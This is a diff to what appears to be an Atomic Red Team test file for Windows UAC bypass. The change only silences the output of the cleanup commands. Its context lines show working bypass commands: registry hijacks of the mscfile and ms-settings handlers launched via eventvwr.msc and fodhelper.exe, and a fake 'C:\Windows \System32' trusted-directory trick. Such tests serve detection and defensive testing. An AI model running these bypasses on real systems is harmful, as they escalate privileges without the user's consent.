@@ -21,7 +21,7 @@ atomic_tests:
       reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
       cmd.exe /c eventvwr.msc
     cleanup_command: |
-      reg.exe delete hkcu\software\classes\mscfile /f
+      reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
 
 - name: Bypass UAC using Event Viewer (PowerShell)
   description: |
@@ -65,7 +65,7 @@ atomic_tests:
       reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
       fodhelper.exe
     cleanup_command: |
-      reg.exe delete hkcu\software\classes\ms-settings /f
+      reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
 
 - name: Bypass UAC using Fodhelper - PowerShell
   description: |
@@ -134,5 +134,5 @@ atomic_tests:
       copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
       mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
     cleanup_command: |
-      rd "\\?\C:\Windows \" /S /Q
+      rd "\\?\C:\Windows \" /S /Q >nul 2>nul
       del "c:\testbypass.exe" >nul 2>nul
